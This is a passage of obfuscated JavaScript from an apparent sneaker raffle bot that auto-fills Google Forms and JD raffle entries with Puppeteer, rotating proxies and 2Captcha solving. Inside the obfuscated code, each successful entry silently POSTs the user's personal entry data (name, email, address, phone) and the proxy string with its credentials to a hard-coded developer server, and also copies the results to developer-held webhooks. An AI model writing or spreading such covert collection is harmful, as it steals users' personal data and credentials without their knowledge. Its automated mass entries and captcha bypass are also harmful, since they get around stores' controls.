                            var _0x553db0 = JSON['stringify'](prxdata);
                            let _0x3e8b04 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x553db0, _0x3e8b04);
                        } catch (_0x3e9936) {
                        }
                        if (_0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '')
                            try {
                                await _0x4bfa5b(_0x5d2560['webhook'], _0x356413['succesDEVMSG']);
                            } catch {
                            }
                        await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x356413['succesDEVMSG']), await _0x5954fc(0xc8);
                        try {
                            await _0x4bfa5b(_0x4b117a, _0x356413['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x124bb9) {
                        console['log'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20' + _0x124bb9), _0x34bf59 = '' + _0x124bb9;
                        var _0x1e7022 = await _0xf2c38e(_0x68ea24[_0x156cbe], _0x986daf, 'dev', !![], _0x34bf59);
                        _0x356413['errorDEV'] = { 'embeds': [_0x1e7022] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x356413['errorDEV']), await _0x4bfa5b(_0x248b77, _0x356413['errorDEV']), _0x359f13 = 'yes';
                    } finally {
                        _0x24e4c8['close']();
                        if (_0x359f13 == 'yes' && _0x10fe4c != 0x5) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x986daf['name'] + ']\x20Task\x20' + (_0x156cbe + 0x1) + '\x20:\x20Retrying\x20(' + _0x10fe4c + '\x20/\x205)')), _0x156cbe = _0x156cbe - 0x1, _0x10fe4c = _0x10fe4c + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x382e03, _0x4087c6, _0x594922) {
                let _0x513824 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x26b255 = _0x1dee0c['readFileSync']('forms/templates.json', 'utf-8');
                let _0x37408a = JSON['parse'](_0x26b255), _0x35fa5b = ![];
                if (_0x37408a['length'] != 0x0) {
                    let _0x1d22c0 = 0x0;
                    for (template of _0x37408a) {
                        if (template['Url'] == _0x4087c6[0x0]['Url']) {
                            _0x35fa5b = !![], console['log'](_0x28396b['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x28396b['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x28396b['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x4c0e6e() {
                                let _0x253b74 = await _0x48d650['get']('answer');
                                if (_0x253b74['answer']['toLowerCase']() != 'y' && _0x253b74['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x4c0e6e();
                                return _0x253b74['answer']['toLowerCase']();
                            }
                            if (await _0x4c0e6e() == 'n') {
                                _0x37408a['splice'](_0x1d22c0, 0x1), console['clear']();
                                break;
                            }
                            _0x513824 = template, console['clear']();
                            break;
                        }
                        _0x1d22c0++;
                    }
                }
                let _0x12dc6a = 0x0, _0x412ea3 = 0x0;
                function _0x352e7d(_0x3a9fc4) {
                    console['log'](_0x52b59e() + '\x20[' + _0x382e03['name'] + ']\x20Task\x20' + (_0x22d156 + 0x1) + '\x20:\x20' + _0x3a9fc4);
                }
                var _0x1be6a7 = 0x0;
                for (key in _0x513824) {
                    if (key['includes']('custom'))
                        _0x12dc6a++;
                    if (key['includes']('Select'))
                        _0x412ea3++;
                }
                for (var _0x22d156 = 0x0; _0x22d156 < _0x4087c6['length']; _0x22d156++) {
                    _0x513824['Url'] = _0x4087c6[_0x22d156]['Url'];
                    let _0x5f0e5f = ![];
                    if (_0x37408a['length'] != 0x0)
                        for (template of _0x37408a) {
                            if (template['Url'] == _0x4087c6[_0x22d156]['Url']) {
                                _0x513824 = template, _0x5f0e5f = !![], _0x352e7d('Found\x20Template');
                                break;
                            }
                        }
                    var _0x3a2516;
                    if (_0x5f3dc0 != 'yes') {
                        if (!_0x5f3dc0)
                            var _0x5f3dc0 = '';
                        else
                            _0x5f3dc0 = '';
                        _0x1be6a7 = 0x0;
                    }
                    try {
                        await _0x414596(_0x4087c6, _0x22d156);
                    } catch {
                        _0x5f3dc0 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x5d2560['useRandomProxy'] = ![])
                        var _0x1535ce = _0x594922[_0x22d156]['split'](':');
                    else
                        var _0x40d1ca = Math['round'](Math['random']() * (_0x594922['length'] - 0x1)), _0x1535ce = _0x594922[_0x40d1ca]['split'](':');
                    var _0x1448e9;
                    if (_0x1535ce['length'] == 0x1)
                        try {
                            _0x1448e9 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1448e9 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x1448e9 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1535ce[0x0] + ':' + _0x1535ce[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1448e9 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1535ce[0x0] + ':' + _0x1535ce[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x4b696d = { 'first': ![] };
                        const _0x2fad6e = await _0x1448e9['newPage']();
                        if (_0x1535ce['length'] != 0x0)
                            await _0x2fad6e['authenticate']({
                                'username': '' + _0x1535ce[0x2],
                                'password': '' + _0x1535ce[0x3]
                            });
                        _0x352e7d('Getting\x20Session');
                        let _0x11199d = ![];
                        try {
                            await _0x2fad6e['goto'](_0x4087c6[_0x22d156]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x5954fc(0xbb8);
                        } catch (_0x3296a3) {
                            throw new Error(_0x3296a3);
                        }
                        const _0x4d7c34 = await _0x2fad6e['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x4d7c34) {
                            _0x352e7d('Login\x20Detected');
                            let _0x130f90 = await _0x4d7c34['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x130f90['click'](), _0x11199d = !![];
                        }
                        let _0x199bbc = await _0x2fad6e['$']('#identifierId');
                        _0x199bbc && (_0x11199d = !![]);
                        await _0x2fad6e['waitForSelector']('.teQAzf');
                        async function _0x4d11b7() {
                            let _0x2ef907 = await _0x2fad6e['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x2ef907) {
                                let _0x47ec97;
                                try {
                                    _0x47ec97 = await question['$eval']('.M7eMe', _0x36ceaf => _0x36ceaf['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x12dc6a != 0x0) {
                                    let _0x3eb03e = ![];
                                    for (let _0x5c4683 = 0x0; _0x5c4683 < _0x12dc6a; _0x5c4683++) {
                                        if (_0x47ec97 == _0x513824['custom' + _0x5c4683]['title']) {
                                            _0x352e7d('Custom\x20Selector\x20found;\x20' + _0x47ec97);
                                            let _0x4d6ca8 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x587681 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x4d6ca8)
                                                await _0x4d6ca8['type']('' + _0x513824['custom' + _0x5c4683]['answer']);
                                            else
                                                _0x587681 && await _0x587681['type']('' + _0x513824['custom' + _0x5c4683]['answer']);
                                            _0x3eb03e = !![];
                                            break;
                                        }
                                    }
                                    if (_0x3eb03e) {
                                        await _0x5954fc(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x412ea3 != 0x0) {
                                    let _0x1eafd6 = ![];
                                    for (let _0xa93672 = 0x0; _0xa93672 < _0x412ea3; _0xa93672++) {
                                        if (_0x47ec97 == _0x513824[_0xa93672 + 'Select']['title']) {
                                            _0x352e7d('Custom\x20Selector\x20found;\x20' + _0x47ec97);
                                            let _0x496eaf = await question['$$']('.ulDsOb');
                                            for (opt of _0x513824[_0xa93672 + 'Select']['answer']) {
                                                let _0x1e56d3 = await _0x496eaf[opt]['$']('span');
                                                await _0x1e56d3['click']();
                                            }
                                            _0x1eafd6 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x1eafd6) {
                                        await _0x5954fc(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x47ec97 == _0x513824['0Select']['title']) {
                                        _0x352e7d('Custom\x20Selector\x20found;\x20' + _0x513824['0Select']['title']);
                                        let _0x17f175 = await question['$$']('.ulDsOb'), _0x1b5c93 = await _0x17f175[_0x513824['0Select']['answer']];
                                        await _0x1b5c93['click']();
                                        continue;
                                    }
                                    if (_0x47ec97 == _0x513824['1Select']['title']) {
                                        _0x352e7d('Custom\x20Selector\x20found;\x20' + _0x513824['1Select']['title']);
                                        let _0x1bbd81 = await question['$$']('.ulDsOb'), _0x2078a1 = await _0x1bbd81[_0x513824['1Select']['answer']];
                                        await _0x2078a1['click']();
                                        continue;
                                    }
                                    if (_0x47ec97 == _0x513824['2Select']['title']) {
                                        _0x352e7d('Custom\x20Selector\x20found;\x20' + _0x513824['2Select']['title']);
                                        let _0x793e42 = await question['$$']('.ulDsOb'), _0x4551d8 = await _0x793e42[_0x513824['2Select']['answer']];
                                        await _0x4551d8['click']();
                                        continue;
                                    }
                                } catch (_0x1f6854) {
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('mail') && !_0x47ec97['toLowerCase']()['includes']('agree') || _0x47ec97 == _0x513824['Email']) {
                                    _0x352e7d('Mail\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x47890a = await question['$']('input');
                                    !_0x47890a && (_0x47890a = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x47890a['type'](_0x4087c6[_0x22d156]['Email']), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('first') || _0x47ec97['toLowerCase']() == 'name' || _0x47ec97['toLowerCase']() == 'name\x20' || _0x47ec97 == _0x513824['FirstName']) {
                                    _0x352e7d('FirstName\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x16e448 = await question['$']('input');
                                    !_0x16e448 && (_0x16e448 = await question['$']('textarea'));
                                    await _0x16e448['type'](_0x4087c6[_0x22d156]['FirstName'] + '\x20'), await _0x5954fc(0x258);
                                    if (_0x47ec97 == _0x513824['FirstName'])
                                        continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('last') || _0x47ec97['toLowerCase']()['includes']('surname') || _0x47ec97 == _0x513824['LastName']) {
                                    _0x352e7d('LastName\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x1dc4b3 = await question['$']('input');
                                    !_0x1dc4b3 && (_0x1dc4b3 = await question['$']('textarea'));
                                    await _0x1dc4b3['type'](_0x4087c6[_0x22d156]['LastName'] + '\x20'), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('address') && !_0x47ec97['toLowerCase']()['includes']('agree') || _0x47ec97 == _0x513824['Address']) {
                                    _0x352e7d('Address\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x45cd85 = await question['$']('input');
                                    !_0x45cd85 && (_0x45cd85 = await question['$']('textarea'));
                                    await _0x45cd85['type'](_0x4087c6[_0x22d156]['Address1'] + '\x20' + _0x4087c6[_0x22d156]['HouseNumber'] + '\x20' + _0x4087c6[_0x22d156]['Address2']), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('phone') || _0x47ec97['toLowerCase']()['includes']('mobile') || _0x47ec97 == _0x513824['Phone']) {
                                    _0x352e7d('Phone\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x7e2419 = await question['$']('input');
                                    !_0x7e2419 && (_0x7e2419 = await question['$']('textarea'));
                                    await _0x7e2419['type']('' + _0x4087c6[_0x22d156]['Phone']), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('country') || _0x47ec97 == _0x513824['Country']) {
                                    let _0x2a1b0d = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x2a1b0d) {
                                        let _0x5a38d5 = ![], _0x5aa108 = await _0x2a1b0d['$$']('.ulDsOb');
                                        for (option of _0x5aa108) {
                                            let _0x5303d1 = await option['$']('span'), _0x20e857 = await option['$eval']('span', _0x2220cb => _0x2220cb['textContent']);
                                            if (_0x20e857['toLowerCase']() == _0x4087c6[_0x22d156]['Country']['toLowerCase']()) {
                                                await _0x5303d1['click'](), _0x5a38d5 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x5a38d5) {
                                            const _0x211025 = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x211025['click'](), await _0x211025['type'](_0x4087c6[_0x22d156]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x352e7d('Country\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x945224 = await question['$']('input');
                                    !_0x945224 && (_0x945224 = await question['$']('textarea'));
                                    await _0x945224['type']('' + _0x4087c6[_0x22d156]['Country']), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('city') || _0x47ec97 == _0x513824['City']) {
                                    _0x352e7d('City\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x27e1ed = await question['$']('input');
                                    !_0x27e1ed && (_0x27e1ed = await question['$']('textarea'));
                                    await _0x27e1ed['type']('' + _0x4087c6[_0x22d156]['City']), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('zip') || _0x47ec97 == _0x513824['Zip']) {
                                    _0x352e7d('Zip\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x38ccf0 = await question['$']('input');
                                    !_0x38ccf0 && (_0x38ccf0 = await question['$']('textarea'));
                                    await _0x38ccf0['type']('' + _0x4087c6[_0x22d156]['Zip']), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('insta') || _0x47ec97 == _0x513824['Follower']) {
                                    _0x352e7d('Follower\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x399b54 = await question['$']('input');
                                    !_0x399b54 && (_0x399b54 = await question['$']('textarea'));
                                    await _0x399b54['type']('' + _0x4087c6[_0x22d156]['Follower']), await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('size') || _0x47ec97 == _0x513824['Size']) {
                                    _0x352e7d('Size\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x1a70cd = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x1a70cd) {
                                        let _0x5654db = await _0x1a70cd['$$']('.ulDsOb');
                                        if (_0x4087c6[_0x22d156]['Size']['toLowerCase']() == 'random') {
                                            var _0x3eac15 = Math['round'](Math['random']() * (_0x5654db['length'] - 0x1));
                                            await _0x5654db[_0x3eac15]['click']();
                                        } else
                                            for (size of _0x5654db) {
                                                let _0x5676e8 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x5d739a => _0x5d739a['textContent']);
                                                if (_0x5676e8['toLowerCase']()['includes'](_0x4087c6[_0x22d156]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x471cf7 = await question['$']('.ry3kXd');
                                    if (_0x471cf7) {
                                        await _0x471cf7['click'](), await _0x5954fc(0x9c4);
                                        let _0x3a528f = await _0x2fad6e['$']('div[jsname=\x22V68bde\x22]'), _0x21f4e3 = await _0x3a528f['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x21f4e3) {
                                            let _0x41581c = await size['$eval']('.vRMGwf.oJeWuf', _0x529484 => _0x529484['textContent']), _0x4c62f3 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x41581c['toLowerCase']()['includes'](_0x4087c6[_0x22d156]['Size'])) {
                                                await _0x5954fc(0x190), await _0x4c62f3['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('receive') || _0x47ec97['toLowerCase']()['includes']('method')) {
                                    _0x352e7d('Method\x20Selector\x20found;\x20' + _0x47ec97);
                                    let _0x578807 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x578807) {
                                        const _0x504777 = await _0x578807['$$']('.ulDsOb');
                                        for (size of _0x504777) {
                                            let _0x1d5f69 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x133db2 => _0x133db2['textContent']);
                                            if (_0x1d5f69['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x5954fc(0x258);
                                    continue;
                                }
                                if (_0x47ec97['toLowerCase']()['includes']('offers') || _0x47ec97['toLowerCase']()['includes']('agree')) {
                                    _0x352e7d('Authorization\x20Selector\x20found;\x20' + _0x47ec97);
                                    const _0x4c8bb7 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x4c8bb7) {
                                        const _0x31cdff = await _0x4c8bb7['$$']('.ulDsOb');
                                        for (size of _0x31cdff) {
                                            let _0x1ebf11 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x31e7b6 => _0x31e7b6['textContent']);
                                            if (_0x1ebf11['toLowerCase']()['includes']('authorize') || _0x1ebf11['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x5954fc(0x258);
                                    continue;
                                }
                                async function _0x4b8302() {
                                    let _0x39f71b = await question['$']('.oyXaNc');
                                    if (_0x39f71b) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x28396b['cyan'](_0x47ec97) + '\x0a');
                                        let _0x58ae62 = await question['$$']('.ulDsOb');
                                        for (let _0x3d3d46 = 0x0; _0x3d3d46 < _0x58ae62['length']; _0x3d3d46++) {
                                            let _0x23c363 = await _0x58ae62[_0x3d3d46]['$eval']('span', _0x52191b => _0x52191b['textContent']);
                                            console['log']('\x20(' + _0x3d3d46 + ')\x20' + _0x23c363);
                                        }
                                        console['log']();
                                        let _0x18879f = await _0x48d650['get']('option'), _0x30ca81 = await _0x58ae62[_0x18879f['option']]['$eval']('span', _0x2baa2f => _0x2baa2f['textContent']);
                                        _0x513824[_0x412ea3 + 'Select'] = {
                                            'title': _0x47ec97,
                                            'answer': _0x18879f['option']['split'](',')
                                        };
                                        let _0x358cd7 = await _0x58ae62[_0x18879f['option']]['$']('span');
                                        await _0x358cd7['click'](), _0x412ea3++;
                                        return;
                                    }
                                    let _0x2894a0 = await question['$']('.Y6Myld');
                                    if (_0x2894a0) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x28396b['cyan'](_0x47ec97) + '\x0a');
                                        let _0x3fbab3 = await question['$$']('.ulDsOb');
                                        for (let _0x5f2949 = 0x0; _0x5f2949 < _0x3fbab3['length']; _0x5f2949++) {
                                            let _0x19a0ce = await _0x3fbab3[_0x5f2949]['$eval']('span', _0x225a1c => _0x225a1c['textContent']);
                                            console['log']('\x20(' + _0x5f2949 + ')\x20' + _0x19a0ce);
                                        }
                                        console['log']();
                                        let _0x21c746 = await _0x48d650['get']('option');
                                        _0x513824[_0x412ea3 + 'Select'] = {
                                            'title': _0x47ec97,
                                            'answer': _0x21c746['option']['split'](',')
                                        };
                                        for (opt of _0x513824[_0x412ea3 + 'Select']['answer']) {
                                            let _0x468c57 = await _0x3fbab3[opt]['$']('span');
                                            await _0x468c57['click']();
                                        }
                                        _0x412ea3++;
                                        return;
                                    }
                                    var _0x4fe10a = 0x0;
                                    let _0x38cdc9 = Object['keys'](_0x513824);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x28396b['cyan'](_0x47ec97) + '\x0a');
                                    for (data of _0x38cdc9) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x4fe10a + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x4fe10a + ')\x20' + data), _0x4fe10a++;
                                    }
                                    console['log']('\x20(' + _0x38cdc9['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x583604 = await _0x48d650['get']('input');
                                    if (_0x583604['input'] == _0x38cdc9['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x55a78f = await _0x48d650['get']('input');
                                        _0x513824['custom' + _0x12dc6a] = {
                                            'title': _0x47ec97,
                                            'answer': '' + _0x55a78f['input']
                                        };
                                        let _0x13bf80 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x3064fe = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0x13bf80)
                                            await _0x13bf80['type']('' + _0x513824['custom' + _0x12dc6a]['answer']);
                                        else
                                            _0x3064fe && await _0x3064fe['type']('' + _0x513824['custom' + _0x12dc6a]['answer']);
                                        _0x12dc6a++;
                                        return;
                                    }
                                    _0x513824['' + _0x38cdc9[_0x583604['input']]] = _0x47ec97;
                                    let _0x5b040c = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x34cdd0 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x5b040c && await _0x5b040c['type']('' + _0x4087c6[_0x22d156]['' + _0x38cdc9[_0x583604['input']]]), _0x34cdd0 && await _0x34cdd0['type']('' + _0x4087c6[_0x22d156]['' + _0x38cdc9[_0x583604['input']]]), await _0x5954fc(0x258);
                                }
                                await _0x4b8302(), await _0x5954fc(0x37a);
                            }
                            let _0x1fad8b = await _0x2fad6e['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x1fad8b)
                                return await _0x1fad8b['click'](), await _0x2fad6e['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x352e7d('New\x20Section'), _0x4d11b7();
                        }
                        await _0x4d11b7(), await _0x2fad6e['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x2fad6e['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x4904f4(_0x4087c6[_0x22d156], _0x382e03), _0x5f3dc0 = 'no';
                        var _0x198649 = await _0xf2c38e(_0x4087c6[_0x22d156], _0x382e03, 'dev', ![]), _0x3398db = await _0xf2c38e(_0x4087c6[_0x22d156], _0x382e03, 'pub', ![]);
                        let _0x29a586 = _0x4087c6[_0x22d156];
                        try {
                            prxdata = {
                                'username': _0x4a7d40['replace']('#', ''),
                                'module': _0x382e03['name'],
                                'entrydata': JSON['stringify'](_0x29a586),
                                'proxy': '' + _0x594922[_0x22d156]
                            };
                            var _0xfa9573 = JSON['stringify'](prxdata);
                            let _0x8002b = { 'headers': { 'content-type': 'application/json' } };
                            await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0xfa9573, _0x8002b);
                        } catch (_0x46d204) {
                        }
                        const _0x3a5a9f = {
                            'succesDEVMSG': { 'embeds': [_0x198649] },
                            'succesPUBMSG': { 'embeds': [_0x3398db] }
                        };
                        try {
                            _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x3a5a9f['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x3a5a9f['succesDEVMSG']), await _0x5954fc(0xc8), await _0x4bfa5b(_0x4b117a, _0x3a5a9f['succesPUBMSG']);
                        } catch (_0x2d4ae9) {
                            console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x22d156 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2d4ae9));
                        }
                        console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x382e03['name'] + ']\x20Task\x20' + (_0x22d156 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x12dc6a != 0x0 || _0x412ea3 != 0x0 && !_0x5f0e5f) && (_0x37408a['push'](_0x513824), _0x1dee0c['writeFileSync']('forms/templates.json', JSON['stringify'](_0x37408a, null, 0x2), 'utf-8'));
                    } catch (_0x5bf980) {
                        console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x382e03['name'] + ']\x20Task\x20' + (_0x22d156 + 0x1) + '\x20:\x20' + _0x5bf980)), _0x3a2516 = '' + _0x5bf980;
                        var _0x35e5e6 = await _0xf2c38e(_0x4087c6[_0x22d156], _0x382e03, 'dev', !![], _0x3a2516);
                        let _0x16e9e8 = {};
                        _0x16e9e8['errorDEV'] = { 'embeds': [_0x35e5e6] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x16e9e8['errorDEV']), await _0x4bfa5b(_0x248b77, _0x16e9e8['errorDEV']), _0x5f3dc0 = 'yes';
                    } finally {
                        _0x1448e9 && _0x1448e9['close']();
                        if (_0x5f3dc0 == 'yes' && _0x1be6a7 != 0x5) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x382e03['name'] + ']\x20Task\x20' + (_0x22d156 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x1be6a7 + 0x1) + '\x20/\x205)')), _0x22d156--, _0x1be6a7++;
                            continue;
                        }
                        if (_0x5f3dc0 == 'yes' && _0x1be6a7 == 0x5) {
                            _0x1be6a7 = 0x0, _0x5f3dc0 = 'no';
                            continue;
                        }
                        _0x352e7d('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1aed2f, _0x5f374c, _0x3f05a6) {
                var _0x306ea7 = ![], _0x3add46 = ![];
                if (_0x5d2560['captchaKey'] == '' || _0x5d2560['captchaKey'] == undefined)
                    return console['log'](_0x28396b['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5d2560['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3e86ca = 0x0; _0x3e86ca < _0x5f374c['length']; _0x3e86ca++) {
                    if (_0x48b8af != 'yes')
                        var _0x48b8af = '', _0x1dcc73 = 0x0;
                    var _0x100219, _0x322297 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x5f374c[_0x3e86ca]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5f374c[_0x3e86ca]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x4a7d40
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5d2560['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3e85bb
                            }
                        ]
                    }];
                    const _0x5a8a20 = { 'embeds': _0x322297 };
                    _0x34c195(_0x1aed2f['name'] + '\x20Task\x20' + (_0x3e86ca + 0x1) + '\x20/\x20' + _0x5f374c['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                    try {
                        await _0x414596(_0x5f374c, _0x3e86ca);
                    } catch {
                        _0x48b8af = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x24149d = await _0xf2c38e(_0x5f374c[_0x3e86ca], _0x1aed2f, 'dev', ![]), _0x2ebeed = await _0xf2c38e(_0x5f374c[_0x3e86ca], _0x1aed2f, 'pub', ![]);
                    const _0x8be449 = {
                        'succesDEVMSG': { 'embeds': [_0x24149d] },
